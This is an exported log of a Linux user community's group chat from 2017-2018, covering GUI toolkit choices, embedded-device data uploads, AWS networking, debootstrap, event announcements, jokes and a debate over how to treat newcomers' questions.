tchncs_bridge,,tchncs_bot,"Yash Bhardwaj: i don't remember now , i tried it in my 3rd semester . its been a long time",1512980021
cocoa,,cocoa1231,"Use either kivy, or if you want a native feel to your app, use pygobject",1512982997
cocoa,,cocoa1231,Kivy is easier tho. And causes you less headaches,1512983030
cocoa,,cocoa1231,But you can always use Glade,1512983037
cocoa,,cocoa1231,For pygobject,1512983046
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: what is a native app ?,1512983077
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: is it like a normal firefox type window,1512983093
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: that's what i always thought it is,1512983108
Kuntal,M,hellozee,"@cocoa1231 unless you are going for android, Qt provides more native look for desktop",1512983252
cocoa,,cocoa1231,Only on QT based desktops,1512983864
cocoa,,cocoa1231,Like plasma or lxqt,1512983870
cocoa,,cocoa1231,Others use GTK,1512983874
cocoa,,cocoa1231,Even window managers like i3 and openbox have better support for GTK than Qt,1512983891
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: how about tkinter ?,1512983926
cocoa,,cocoa1231,It won't look native anywhere,1512983963
cocoa,,cocoa1231,idle is written in Tkinter,1512983980
cocoa,,cocoa1231,And I don't recommend kivy for desktop apps for Linux,1512984013
Kuntal,M,hellozee,üòÇüòÇ,1512984017
Kuntal,M,hellozee,Qt provides native look and feel for even windows and mac,1512984057
cocoa,,cocoa1231,I noticed that when using plasma the compositor is disabled when kivy is running. Weird,1512984060
cocoa,,cocoa1231,"Yeah, but he wants to build a Linux app",1512984075
Kuntal,M,hellozee,you didn't get the point..,1512984096
cocoa,,cocoa1231,?,1512984103
cocoa,,cocoa1231,Plus Qt can be heavy,1512984143
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: i got the point,1512984146
tchncs_bridge,,tchncs_bot,Yash Bhardwaj: that is a problem,1512984162
Kuntal,M,hellozee,"so will be every mature, good looking GUI kit...",1512984239
Kuntal,M,hellozee,"when comes about performance better use something like wxWidgets, FLTK, tkinter, they are pretty light..",1512984277
cocoa,,cocoa1231,"Yeah, but why use a heavy toolkit when you can get the job done with a more stripped down toolkit?
And plus GTK is a pretty rich toolkit, without sacrificing memory",1512984300
cocoa,,cocoa1231,That goes to another extreme of extremely light but a pain in the ass toolkits,1512984330
cocoa,,cocoa1231,I find GTK to be a nice balance between the two ends of the spectrum,1512984348
cocoa,,cocoa1231,But you should try out some toolkits to see which one suits you yash,1512984368
cocoa,,cocoa1231,"Because at the end of the day, if the app works, no one gives a shit on how it looks :P",1512984393
cocoa,,cocoa1231,Kivy apps have a unique advantage though,1512984461
cocoa,,cocoa1231,Kivy allows you to create custom widgets easily,1512984471
cocoa,,cocoa1231,Why won't my message edit...,1512984491
cocoa,,cocoa1231,"Anyway, try out tkinter, pyqt, and pygobject (and kivy too maybe?) To see which one fits you",1512984522
Kuntal,M,hellozee,"So does Qt, you just inherit a widget and override it's paintEvent function..",1512984561
cocoa,,cocoa1231,"Hmm. I haven't used Qt that much, so I'll take your word for it",1512984596
cocoa,,cocoa1231,"For me, the selling point of kivy is the .kv  language. I hate using graphical designers to build GUIs, and kivy provides a pretty easy way to script the GUI.",1512984655
Kuntal,M,hellozee,havent heard of QML isnt it? üòè,1512984721

The FCC's Dec. 14 decision willfully ignored the outcry from tens of millions of people, and it abdicated the FCC's responsibility to protect the internet from ISP blocking and discrimination.

Srihari,Unnikrishnan,arcsaber,I have more messages then anyone has ever sent in matrix,1514297488
Raghav,,Rwbhu,What are the best practices for embedded devices uploading data securely to a central server ? Encryption or is VPN and ssh enough ?,1514298420
tchncs_bridge,,tchncs_bot,"Aurabindo: Raghav:  Wouldnt VPN add more overhead to the embedded device ? if its something capable, then its fine. But what level of security do you want ? If you could tell the use case, I can suggest better",1514304444
Raghav,,Rwbhu,VPN is  huge.,1514304881
Raghav,,Rwbhu,I have around 20mb of text files to upload daily to the servers,1514304917
Raghav,,Rwbhu,From the embedded Linux,1514304930
Raghav,,Rwbhu,Openwrt devices.,1514304938
tchncs_bridge,,tchncs_bot,"Aurabindo: Raghav: for openwrt devices vpn is not a big deal. I was think devices like bluetooth beacons, cortex m4 kind devices. If the server to which you want to transfer the data has a static ip, then you can try registering for a domain, get a free lets encrypt certificate, and simply use https to communicate with the server. Usual https is quite secure, unless you are paranoid and you dont trust the web chain of trust. Then you will have to encrypt your files with PKI (gpg) and send it along",1514305286
tchncs_bridge,,tchncs_bot,"Aurabindo: BUt the basics of server safety applies here. Make sure you dont have unnecessary ports open on the server, etc",1514305615
tchncs_bridge,,tchncs_bot,"Aurabindo: In case you dont want to get a domain, its not impossble to get an SSL certificate bound to your static IP, rather than a common name, but i've never tried.",1514305615
tchncs_bridge,,tchncs_bot,Aurabindo: I dont know if letsencrypt system accept IP bound certs,1514305681
tchncs_bridge,,tchncs_bot,Aurabindo: Something you can try ;),1514305690
Raghav,,Rwbhu,For some reason I don't have https,1514305736
Raghav,,Rwbhu,And VPN packages are quite heavy on the routers,1514305766
tchncs_bridge,,tchncs_bot,Aurabindo: how come? you dont need a VPN server running on the client,1514305825
tchncs_bridge,,tchncs_bot,"Aurabindo: on your router, you only need a vpn client",1514305836
tchncs_bridge,,tchncs_bot,Aurabindo: how is it heavy ?,1514305841
tchncs_bridge,,tchncs_bot,"Aurabindo: and if you dont want an http based system, then your other option would be some kind of decentralized tech. That would be more complex than https. for example, IPFS",1514306011
tchncs_bridge,,tchncs_bot,Aurabindo: well I dont have any quantitative results to prove IPFS is complex than simple http,1514306073
tchncs_bridge,,tchncs_bot,Aurabindo: but it needs an additional daemon doing its thing in your router,1514306103
tchncs_bridge,,tchncs_bot,Aurabindo: but you already have the necessary http backend to do the job in openwrt based stuff,1514306118
tchncs_bridge,,tchncs_bot,Aurabindo: and the IPFS daemon is IMO relative more heavy than a VPN plugin,1514306153
tchncs_bridge,,tchncs_bot,"Aurabindo: OR, if you feel adventurous try ZeroMQ",1514306376
tchncs_bridge,,tchncs_bot,"Aurabindo: pretty lightweight, extremely fast",1514306382
tchncs_bridge,,tchncs_bot,"Aurabindo: but you have to look deeper how to deal with security, that was your primary concern. If light weight is the factor, zeromq is a no brainer",1514306430
tchncs_bridge,,tchncs_bot,Aurabindo: encryption in Zeromq would AFAIK require you to manually generate the certificates,1514306499
tchncs_bridge,,tchncs_bot,"Aurabindo: those things are automated if you use simple http, with letsencrypt",1514306521
Raghav,,Rwbhu,Because of my other stuff running on the same.devices.,1514307033
Raghav,,Rwbhu,And the embedded devices are tiny 4MB flash capacity only,1514307058
tchncs_bridge,,tchncs_bot,"Aurabindo: 4MB is indeed quite small for an openwrt dev. They are quite old, arent they ?",1514307195
tchncs_bridge,,tchncs_bot,Aurabindo: then zmq is your best bet,1514307209
tchncs_bridge,,tchncs_bot,Aurabindo: which soc is it ?,1514307253
Raghav,,Rwbhu,Ar71xx mips,1514307565
Raghav,,Rwbhu,Which VPN is the best amongst these ...,1514307603
Raghav,,Rwbhu,"openVPN, strongswan tinc VPN",1514308139
Raghav,,Rwbhu,Didn't find zero mq in the repos,1514308433
Raghav,,Rwbhu,Found mosquito client nossl as well as ssl,1514308450
Raghav,,Rwbhu,Mosquito broker also,1514308458
tchncs_bridge,,tchncs_bot,Aurabindo: thats probably because of zmq licensing terms,1514308522
tchncs_bridge,,tchncs_bot,Aurabindo: i think you dont need a broker for zmq. it may be an advantage over mosqito,1514308547
tchncs_bridge,,tchncs_bot,Aurabindo: i remember reading somewhere,1514308552
tchncs_bridge,,tchncs_bot,"Aurabindo: i heard that fedora switch from some other mqtt protocol to zeq for their fedmsg system, and got 100 times improvement",1514308592

If Operating Systems Ran The Airlines... 

UNIX Airways 

Everyone brings one piece of the plane along when they come to the airport. They all go out on the runway and put the plane together piece by piece, arguing non-stop about what kind of plane they are supposed to be building.

Air DOS 

Everybody pushes the airplane until it glides, then they jump on and let the plane coast until it hits the ground again. Then they push again, jump on again, and so on... 

Mac Airlines 

All the stewards, captains, baggage handlers, and ticket agents look and act exactly the same. Every time you ask questions about details, you are gently but firmly told that you don't need to know, don't want to know, and everything will be done for you without your ever having to know, so just shut up.

Windows Air 

The terminal is pretty and colourful, with friendly stewards, easy baggage check and boarding, and a smooth take-off. After about 10 minutes in the air, the plane explodes with no warning whatsoever. 

Windows NT Air 

Just like Windows Air, but costs more, uses much bigger planes, and takes out all the other aircraft within a 40-mile radius when it explodes.

Windows XP Air 

You turn up at the airport,which is under contract to only allow XP Air planes. All the aircraft are identical, brightly coloured and three times as big as they need to be. The signs are huge and all point the same way. Whichever way you go, someone pops up dressed in a cloak and pointed hat insisting you follow him. Your luggage and clothes are taken off you and replaced with an XP Air suit and suitcase identical to everyone around you as this is included in the exorbitant ticket cost. The aircraft will not take off until you have signed a contract. The inflight entertainment promised turns out to be the same Mickey Mouse cartoon repeated over and over again. You have to phone your travel agent before you can have a meal or drink. You are searched regularly throughout the flight. If you go to the toilet twice or more you get charged for a new ticket. No matter what destination you booked you will always end up crash landing at Whistler in Canada.

Linux Air 

Disgruntled employees of all the other OS airlines decide to start their own airline. They build the planes, ticket counters, and pave the runways themselves. They charge a small fee to cover the cost of printing the ticket, but you can also download and print the ticket yourself.

When you board the plane, you are given a seat, four bolts, a wrench and a copy of the seat-HOWTO.html. Once settled, the fully adjustable seat is very comfortable, the plane leaves and arrives on time without a single problem, the in-flight meal is wonderful. You try to tell customers of the other airlines about the great trip, but all they can say is, ""You had to do what with the seat?""

Example:
Sorry, this is the best analogy on the subject of linux, has been around for a long time, and is anonymous.

BTW, linux is the kernel, GNU/GPL software make up the rest of the OS and apps.  GNU/Linux is the way lawyers will say it in court.",1515396792

T K,Sourabh,tk_sourabh,"No, its 5%.",1516043075

Linux is not an operating system unto itself, but rather another free component of a fully functioning GNU system made useful by the GNU corelibs, shell utilities and vital system components comprising a full OS as defined by POSIX. Many computer users run a modified version of the GNU system every day, without realizing it. Through a peculiar turn of events, the version of GNU which is widely used today is often called 'Linux', and many of its users are not aware that it is basically the GNU system, developed by the GNU Project. There really is a Linux, and these people are using it, but it is just a part of the system they use. Linux is the kernel: the program in the system that allocates the machine's resources to the other programs that you run. The kernel is an essential part of an operating system, but useless by itself; it can only function in the context of a complete operating system. Linux is normally used in combination with the GNU operating system: the whole system is basically GNU with Linux added, or GNU/Linux. All the so-called 'Linux' distributions are really distributions of GNU/Linux.",1516471527

cocoa,,cocoa1231,"Hey @realslimshanky, how do I get a chat's message history from a bot?",1517044722
Shashank,Kumar,realslimshanky,You cannot get messages from history. Bot api only allowes to get messages which are being sent after the bot is added to the group in real time,1517045048
cocoa,,cocoa1231,There seems to be something called telethon that's supposed to let you do this,1517050597
Shashank,Kumar,realslimshanky,let me check about this. is this new update in bot api?,1517050635
cocoa,,cocoa1231,No I think this is another api,1517050652

Xeon,Zolt,Xeon_Zolt,Bot api and telegram api both are different,1517051436
Xeon,Zolt,Xeon_Zolt,You can use telegram-cli and export the messages,1517051511
cocoa,,cocoa1231,Thanks!! Exactly what I was looking for,1517051530
cocoa,,cocoa1231,Can it also export messages from private chats?,1517051540

Shashank,Kumar,realslimshanky,great. I never touched that. telethon works by creating an whole other instance of client instead of using bot api. maybe that's the telegram api you are talking about.,1517051656

Guys!

We are HashInclude, Delhi University's Cluster Innovation Centre. Exploiting people's addictiveness to WhatsApp, we decided to drop a message.

*Cluster Innovation Centre's Month of Code*, or CMoC for short is an event focused on introducing students to open source development. You get to work with some of the most experienced mentors from various places, including Indian Institute of Technology, London School of Economics and more.

How does this benefit you?
You get to 'apply' your programming skills in real life projects and be prepared for *Google Summer of Code*!

There're goodies if you do good!

Here's the link to the Github repo with all the required information,
https://github.com/clusterinnovationcentre/CMoC

You can find the student manual here,
https://goo.gl/VvQjN5

Thanks!
*P.S. Last date to apply is 28th January!*",1517117987

ICFOSS intends to conduct a Women Hackathon, 3 ‚Äì day residential camp for college students during 2-4 February, 2018 at ICFOSS Training Centre, Technopark.

Learning and knowledge creation process in students are heavily mediated by their gender. Based on this fact some of the sessions are intended to initiate open discussion and brainstorming on how the issue of gender and technology play out in our society. And we are trying to see technology through the lens of gender.

There will be classes on Free Software, Programming, Expert talks, Film Screening on Free Software, Interactive fun games etc. in this programme. We hope that there will be more bonding between the students to transfer the ideas of Free Software at the end of this programme.

Food and accommodation expenses of these selected students will be met by ICFOSS during these 3 days. They will be provided with an e-certificate of participation.",1517220202

Manpreet,Nehra,Manpreetn,ftp is a deprecated protocol,1517568621
Manpreet,Nehra,Manpreetn,and aws hosts lose their IPs when they are stopped and restarted,1517568671
Manpreet,Nehra,Manpreetn,to work around it you should get a Elastic IP first,1517568681
Manpreet,Nehra,Manpreetn,and then attach that elastic IP to the host on boot always,1517568692
Manpreet,Nehra,Manpreetn,ofcourse getting elastic IP you pay extra,1517568704
Manpreet,Nehra,Manpreetn,coz its a chargeable service,1517568715
Manpreet,Nehra,Manpreetn,seconday workout is use Dyndns,1517568725
Manpreet,Nehra,Manpreetn,configure the host and put dyndns scripts to update the hosts IP in dyndns,1517568746
Shivani,Bhardwaj,shivanib,Does this cost less?,1517571739

Shivani,Bhardwaj,shivanib,"But, Elastic IPs are not charged as far as they are associated with a running instance (if its just one Elastic IP) which is most of the time. It is only charged when it is reserved and not being used.",1517572219
Shivani,Bhardwaj,shivanib,But yeah the rates for not using it are $0.01 an hour. Would make a good cost if instance is not used for a long period.,1517572360

Manpreet,Nehra,Manpreetn,so its working,1517580078
Manpreet,Nehra,Manpreetn,otherwise deb would have dropped it,1517580084
Manpreet,Nehra,Manpreetn,rssh is less shell more like a firewall around ssh,1517580135

A good way to help Krita Devs - Triaging bugs on the bug tracker. As Krita gets more popular there will be more users and in turn there will be more bug reports. This is a sign of healthy project but as well know Krita is run by volunteers and bug triaging takes a lot of time of the devs.
Bug triaging is checking whether the bug is reproducible or not, asking for information and doing the initial weeding of duplicated bug reports. We users can really help the devs in this department and this will help them save time to actually work on making Krita more awesome.
Refer to this document for instructions -  and get started

Rijul,Gulati,kryptxy,"Hi all,
I'd like to share a python program I wrote while learning python.

It's a command-line torrent search program that fetches and downloads torrents from various torrent-hosting sites. I named it Torrench (TORRENt searCH). It's cross-platform and is completely open-source.

What it does 
It fetches a list of torrent proxies and checks if the torrent proxy is available. If it is, it fetches results and displays results in terminal/cmd window.

Sites supported 
TPB, KAT, RarBg, Limetorrents, libgen, 1337x, Distrowatch, and many more (please see documentation).

Features
- Load torrent to client from torrench (configurable)

- Cross-site search: Search more than one site with a single command.

And much more...

I have included samples along with required configuration instructions in documentation.

Hope you find it useful. Suggestions/Feedbacks are more than welcome :)

list1 = [t, shift+t, s, f]
list2 = [tiled,pseudo_tiled,floating,fullscreen]

What that entry is doing is seeing what is the index of the keypress from list1 (so for instance, mod3+s would mean that the 2nd index was pressed, mod3+f would be the 3rd), and executing the the command corresponding to the same index (so if mod3+s was pressed, the command executed would be bspc node -t floating, mod3+f would be bspc node -t fullscreen).",1519558337

I was considering it to be {(t,shift) + (t,s,f)}
and then simplifying it to t + (t,s,f) & shift + (t,s,f)

Yes you can achieve more with Adobe Suite, this is because they are suite and not a set of separate tools.

So to uninstall it , I did purge and I guess I removed it. But I wasn't sure what's the difference between purge and rm, and wasn't able to make it clear via google. Hence, I asked this question. What exactly is the difference between them?",1520313617
Piyush,Malhotra,Piyushmalhotra,"Ohhkaayy got it , and when do I used rm?",1520313643
Aditya,Agrawal,adityaagrawal,Rm is used to remove a directory,1520313658
Aditya,Agrawal,adityaagrawal,Or a file,1520313664
Aditya,Agrawal,adityaagrawal,To remove a non empty directory you can use -rf options with rm,1520313687
Kuntal,M,hellozee,*anything,1520313694
Aditya,Agrawal,adityaagrawal,Yes,1520313704
Piyush,Malhotra,Piyushmalhotra,"So to uninstall an application, I purge it and ro remove a folder/file I rm -rf it?",1520313757
Aditya,Agrawal,adityaagrawal,To remove a file rm is enough -rf options basically delete anything recursively in a directory. You can gain more knowledge in the documentation,1520313827
Piyush,Malhotra,Piyushmalhotra,Thanks aditya :),1520313864

PROBLEM: high cpu usage while using browser ( used by web content process on mozilla, and chrome-type-render on chrome). Fan usually makes some noise with cpu usages ranging between 40%-80%, while temperature is around 60¬∞ on task like uploading txt file to drive, or while viewing videos even on 480p or browsing google.
I tried solutions like updating graphic driver , removing all the browser plugins and re-installing the browsers after clearing the previous data.
Any solutions for this?
(Usage goes high only when browser is used)

vipulgupta2048,,vipulgupta2048,Suppose I need to add a package to a live-build. Package can be Plymouth for example and the build be like any distro that doesn't already ship out with Plymouth.,1522201394
vipulgupta2048,,vipulgupta2048,How to do I install and configure Plymouth into the build. So next time I install it. It is already there.,1522201432
Satyakam,Goswami,Satyaakam,Depends why are you doing this,1522201486
Satyakam,Goswami,Satyaakam,the approach you are trying is old way of doing things,1522201509
Satyakam,Goswami,Satyaakam,why don't you use Docker etc..,1522201520
Satyakam,Goswami,Satyaakam,again it depends on what you are trying to do,1522201536
vipulgupta2048,,vipulgupta2048,The aim is to add a boot logo to the distribution.,1522201540
vipulgupta2048,,vipulgupta2048,And I changed my in xubuntu using Plymouth,1522201562

Satyakam,Goswami,Satyaakam,you dont install plymouth etc you just change the distro the way you want and build it,1522201798
Satyakam,Goswami,Satyaakam,check http://www.linuxfromscratch.org/ to know how things work,1522201880

Personal Projects - @hellozee's cook or @tk_sourabh's Flask application. Any projects made by community members can be featured here. If it is good enough, make some good first issues for beginners to tackle.

Ayan,Pahwa,cli_ninja,"Basically every CPU has peripheral known as timer, which is generally size of CPU word size, say 64 bit , so it can count upto that value and sets the timer flag which is monitored by program . Also the timer has clock which can be independent to system or CPU clock, it can has prescalor value which again depends on architecture which allows to count slow and more 

Basic delay generation you can do with loops if you know exactly how many clock cycle it takes to execute one statement 

for(int i=0; i<value;i++); 

Value is decided by no of clock cycles to generate specific delay! However this is not applicable for generic non real time systems thus timers are helpful! Also RTC in system is not very accurate it runs on 32.768khz frequency because of quartz harmonics resonance this is impacted by temperature.",1523272246

cocoa,,cocoa1231,"Hey. Debian people. I'm trying to move to elementary OS. So basically debian. But one thing that's holding me back is setting up vim on debian. On my arch linux system, I have a list of packages from the arch repo's that I can just pacman -S and I've got my setup ready (and a short vimrc). How do I find the debian alternatives to those packages? I love using vim, but hate setting it up.

Here's the list of arch linux packages: https://gitlab.com/cocoa1231/dotfiles/blob/master/vim_requirements",1523456539
Kuntal,M,hellozee,actually you could just avoid the extra packges if you just use vundle/pathogen instead of pulling from arch repos,1523456646
cocoa,,cocoa1231,"Yeah, but I tried and couldn't really get it to work. It was just way easier to do pacman -S $(cat vim_requirements), so I never bothered to do anything",1523456686
cocoa,,cocoa1231,And I also got those packages by doing a regex search on the arch repost. Just did vim-* and got a decent vim setup :P,1523456708
cocoa,,cocoa1231,Removed some bloat I didn't want and that was it,1523456718

Sandeep,Kr,,https://www.madresistor.com/libreplot/,1525085847
Sandeep,Kr,,https://gitlab.com/madresistor/libreplot/,1525085890
cocoa,,cocoa1231,You mention in the README.md that other plotting libraries could not satisfy your demands. Can you be more specfic as to what those demands were?,1525087307
cocoa,,cocoa1231,"https://www.quora.com/How-can-I-integrate-a-Python-code-in-the-Android-Java-app

You can run matplotlib or something on server side and use a simple plotting or image creating library to update the canvas on the android device (recieving instructions from the server)",1525087393
cocoa,,cocoa1231,That way you can have more resource intensive stuff running on the server and all the mobile device has to do is create an image.,1525087423
cocoa,,cocoa1231,Something like that,1525087427
cocoa,,cocoa1231,But you can't make it offline then,1525087445
Harsh,Spookdilya,MSFJarvis,I'd rather use GPU backed local plotting than relying on finicky server side tooling,1525087490
cocoa,,cocoa1231,"But matplotlib is well supported, has a shit ton of functions, and recreating a library like that would be like reinventing the wheel. Why do so much work when you can rely on pre existing, well supported and test libraries that already exist?",1525087566
cocoa,,cocoa1231,"Again, just using matplotlib as an example. Not tied to that module",1525087586
Kuldeep Singh,Dhaka,kuldeepdhaka,"1. Other libraries were abstracting GPU so much that there was loss of efficiency. Better can be done.
2. Not all run on phones (OpenGLES)
3. Some libraries were specific to a toolkit
4. I couldn't find anything that was in C and OpenGLES",1525087639
Kuldeep Singh,Dhaka,kuldeepdhaka,(Things that I can recall at the moment),1525087659
cocoa,,cocoa1231,But all of those can be fixed by using a server-client model with the server doing the computation and using something like the Python Imaging Library to draw the pictures,1525087708
cocoa,,cocoa1231,On the device,1525087716
cocoa,,cocoa1231,"If I had to just create something like this, I'd go for a kivy+PIL+server stack or something. But that's just me using python. Any similar stack would work",1525087760
Kuldeep Singh,Dhaka,kuldeepdhaka,"1. There is no server here
2. User need to interact with graph",1525087797
Harsh,Spookdilya,MSFJarvis,"1) relying on a server just to draw a graph is an unsustainable approach unless you get everybody to host their own copy, which again is not convenient.
2) This is 2018, phones have GPUs decent enough to render graphs",1525087824
Harsh,Spookdilya,MSFJarvis,Why move processing to the cloud for no reason but to move it,1525087842
cocoa,,cocoa1231,Hm. Okay. I guess that makes sense. But I'm talking about moving it to a server because we don't have a graphing library powerful enough on android,1525087889
Harsh,Spookdilya,MSFJarvis,That's what's being fixed here :p,1525087909

cocoa,,cocoa1231,"Do we have to install it to do it? Can't we just mount the squashfs filesystem, and create a tar of it?",1525163905
.,,rajudev,debootstraping does not mean installing,1525163932
cocoa,,cocoa1231,"Oh. As far as I understand it, it's to create a chroot environment, right?",1525163951
cocoa,,cocoa1231,And don't you have to have an installed system to chroot into?,1525163973
Kuntal,M,hellozee,ahh no,1525163996
cocoa,,cocoa1231,You can chroot into an ISO?,1525164009
Kuntal,M,hellozee,I can just untar the gentoo base install and chroot into it,1525164015
cocoa,,cocoa1231,Talking about hamara linux. It doesn't have a stage-n tarball,1525164049
Kuntal,M,hellozee,aww,1525164078
cocoa,,cocoa1231,Hehe. Most distros do not,1525164085
.,,rajudev,you can debootstrap a system through the debootstrap command and gives you a base system which you can use as u want.,1525164126
cocoa,,cocoa1231,So it creates something like a container?,1525164150
cocoa,,cocoa1231,I'll just try it out,1525164153
.,,rajudev,container's are something which got built up on top of chroots,1525164174

Chirag,Sehra,ChiragSehra,My wifi driver is not working. Should I send output of lspci?,1525164210
cocoa,,cocoa1231,"Yeah, I get the idea. What I'm asking is that when you create a debootstrap env, it has to download the filesystem na?",1525164235
cocoa,,cocoa1231,Yes please,1525164240
cocoa,,cocoa1231,And which OS you are on,1525164245
.,,rajudev,"yes, that is the basic operation of debootstrap",1525164272
cocoa,,cocoa1231,Yeah. So that's what I was asking. Can you do it through just extracting the squashfs filesystem?,1525164293
cocoa,,cocoa1231,If you already have the ISO,1525164297
.,,rajudev,"you can, but the debootstrap is much easier and cleaner.",1525164323
Chirag,Sehra,ChiragSehra,18.04 Xubuntu,1525164328
.,,rajudev,The ISO might be old.,1525164330
.,,rajudev,but the debootstrap will always be the latest,1525164342
cocoa,,cocoa1231,Yeah. I was just wondering if the squashfs is the rootfs.tar.gz. I wanted to know if they're the same thing,1525164365
.,,rajudev,they are. debootstrap is a cleaner way/approach,1525164450
cocoa,,cocoa1231,Ohkay. So debootstrap is like pacstrap. It downloads the rootfs into a target directory,1525164476

cocoa,,cocoa1231,"Okay this is becoming a concerning trend in this community. While it is true that people should Google before asking, it's also very discouraging to tell people to RTFM or ""just Google it"". This is supposed to be a welcome community for all questions, from the trivial, which elicit the LMGTFY response, to the intriguing ones which have still not been solved (why does yes behave so fucking weirdly @tk_sourabh?!), and telling people to just go and google it isn't helpful. Solve that person's query, and then tell them how to ask better. That's how people learn. That's how communities grow. Just because it's trivial to you, does not mean it's trivial to the person asking",1526842323
cocoa,,cocoa1231,"Telling people to look it up discourages them to even speak up and ask the questions, just because of the humiliation they might suffer. And then they'll just give up on Linux. The community is there to help. You put in the effort, and the community will help you back",1526842468
cocoa,,cocoa1231,"We should borrow LCI's motto. Be polite, be helpful",1526842523
cocoa,,cocoa1231,Me currently :P,1526842754
cocoa,,cocoa1231,,1526842754
Manas,kashyap,reflect0r,Thx @cocoa1231,1526843158
Kuntal,M,hellozee,"I don't think asking someone to search is rude or humiliating in some way, though LMGTFY is somewhat.
Solve that person's query, and then tell them how to ask better.
In other words solving their problem and saying them that you just could have searched it, sounds like some kind of humiliation.
A trivial question is not always equivalent to a First Link Answer Question, we are community not a customer support.
At least from a developer or someone who studies computer science, I wouldn't expect a FLA question, if he/she is not computer person, then the thing is different.",1526843472
Manas,kashyap,reflect0r,"@hellozee its not the case, Okay for me, I feel really bad whenever i ask something, in group, because i know there are many people in group who knows a lot more than me, and what i get in return is a google link, if i had to do it, then why should be i. In a community,? Google helps me and thats it,",1526843626
Manas,kashyap,reflect0r,I never feel motivated to use linux except because of few people's who help me whenever i get stuck,1526843650
cocoa,,cocoa1231,"Yeah, but that's just your perspective na? I won't name names, but I've talked to a lot of people from this community who have felt this and then stopped asking. And you're right. We're not customer support. But we are a community who want to endorse Linux. Who want to promote Linux. And if you feel like FLA questions are too simple and should be answered by Google, then that's fine. You can tell the person politely. And if you can, solve their query. If not, no one's asking you to. That's the key difference between this and customer support. You don't have to answer. But we do answer because we want that person to have a good experience with Linux.",1526843747
Manas,kashyap,reflect0r,"I know my question are sometimes stupid, But yeah i don't know about systems, and it breaks whenever i try to do something, i figure out what i breaking it and next time something or other breaks it. So, i think someone who is more experienced can help me, Today my mint system broked, but i didn't asked anyone why its, Morning i sended a msg and a clip, and no one helped me out, so i stopped asking about it,",1526843796

Ayan,Pahwa,cli_ninja,"Well i read somewhere a software person is a guy who knows how to use google and stack overflow üòÖ and come on friends were just pulling your leg, it happened to all of us üòâ, IMO googling is an art and you should learn to do it, try helping yourself ! Community forums should be your last resort! Again that‚Äôs my personal opinion....",1526844839
vipulgupta2048,,vipulgupta2048,"Something to support the art of googling which I totally agree to 

https://twitter.com/vipulgupta2048/status/988827280334979073?s=19",1526845668
cocoa,,cocoa1231,"Yes, but that just pulling your leg part is very subtle, and most people don't get it. Espcially newbies who don't know the inside-jokes of a community. And yeah, googling is an art, and they should learn how to do it, so how about we teach it to them? And as far as community forums being your last resort is for communities who get so big that they have to use the stratigy. We aren't that big. That's the whole point of these local communities. 

When LUGs started, they used to be fest-like events where people would literally wheel in their computers so that the neck beards could take a look and help people out. And that's the whole idea! To create a space for people who don't know how to google, or what to google, to ask their questions. 

If you feel like the question is easily answerable with a google search, say something like Try searching <search text>. Someone else want to elaborate on this?. You should teach the person how to ask questions without making them feel like they're asking something dumb. And to be honest, I know people say there is no such thing as a dumb question, and mostly you brush it off as something people say, but I've found it to be the case that I have leared a bunch while trying to help someone.",1526845687

Gourav,Chawla,gouravchawla,"At my office we are exploring different options of setting up our test enviornment. What would you guys suggest would be the best approach - buying our own hardware and setting up a server in our office or getting it from a provider like Digital ocean, aws.  Server configuration that we are considering is 12 core processer(s), 28-32 GB memory, 3TB+ Harddisk, OS -  Fedora. Stack - Django, Angular, SOLR, Redis, Nginx",1527165806
jayant,,gamezgeek,"@gouravchawla the question that you need to answer is whether you want your dev environment to work when internet is not working. If the answer is yes, you need to have a local hardware setup.",1527166561
Gourav,Chawla,gouravchawla,"I'm assuming that internet won't be an issue. We therefore are not considering that variable. And to answer your question, no we don't want offline access for this environment. Every developer has the local enviorment setup which takes care of that.",1527166946
jayant,,gamezgeek,In that case aws makes a lot of sense. As you will be able to provision hardware as required.,1527167034
Satyakam,Goswami,Satyaakam,"Depends on whar you want to test , no to hardware setup for apps testing",1527167057
Gourav,Chawla,gouravchawla,Okay. Thanks for your input.,1527167070
Satyakam,Goswami,Satyaakam,Scale horizontally on the cloud,1527167088
vipulgupta2048,,vipulgupta2048,"I literally know nothing about this, but if you go with Digital Ocean or AWS wouldn't scaling factor be involved.",1527167098
vipulgupta2048,,vipulgupta2048,Just thinking out loud,1527167107
Satyakam,Goswami,Satyaakam,No it wont be thats what scaling i was referring to,1527167139
Gourav,Chawla,gouravchawla,Our own web application.,1527167160
Satyakam,Goswami,Satyaakam,its lots of fun crashing an app :P,1527167212
Gourav,Chawla,gouravchawla,I meant to answer this - our own Django powered web app.,1527167229
jayant,,gamezgeek,"You are welcome. I had the similar confusion in my office. But for us internet is not reliable. So, we went for a local setup. We now have a bunch of servers on premise & we use openstack for creating boxes as required.",1527167231
Gourav,Chawla,gouravchawla,"So, cloud provider rather than our own hardware setup, is that what you are saying?",1527167281
Satyakam,Goswami,Satyaakam,yup,1527167314
Gourav,Chawla,gouravchawla,Oh great. Would love to have a chat on the kind of setup you have. Open to DMs?,1527167341
Satyakam,Goswami,Satyaakam,The use case he has is totally different and Hardware in his case makes sense,1527167379
Gourav,Chawla,gouravchawla,"Yes, i understand. Just curious about the hardware they are using since i was also browsing some hardware online.",1527167527
jayant,,gamezgeek,Sure,1527167743

Philomath,,miphilomath,"Hi @iamchauhan, how about an introduction?",1527394567
Vikas,Chauhan,iamchauhan,"Long time linux user, sys admin, network admin. I started when linux was just catching up and they gave a free CD with the Digit magzine. Linux ver 0.93 or so. I didnt have a CD drive or even a comp at that time , but the very idea of a free CD was out of this world then, atleast in india. back in early 90s. I ve extensively worked on the linux kernel networking stack optimizing and fine tunning the TCP algos within. Other than linux I have a decent view of the security landscape. However, I dont have a public github repository, or CVEs to my name. or any public visibility, so take everything with a pinch of salt üòâ most familiar with ubuntu and debian. last worked on redhat side with fedora 18-ish. Dont know emacs. Fan of Vi. Dont care about the desktop environment. havent used any other shell than BASH. havent coded much. have read a lot of code. etc etc !",1527396137
Vikas,Chauhan,iamchauhan,how's that for an intro? :-|,1527396161
AJ,,ajnsit,"‚ÄúDon‚Äôt know emacs, fan of vi‚Äù - try spacemacs. It changed my life",1527396389
Philomath,,miphilomath,That is a great intro :),1527396431
Vikas,Chauhan,iamchauhan,"The only expusure to emacs is the key bindings I have used for command line editing in bash. I thought i was too old to learn new tricks, but I will try spacemacs if it is life changing üòä Will let you know how it turned out.",1527396747
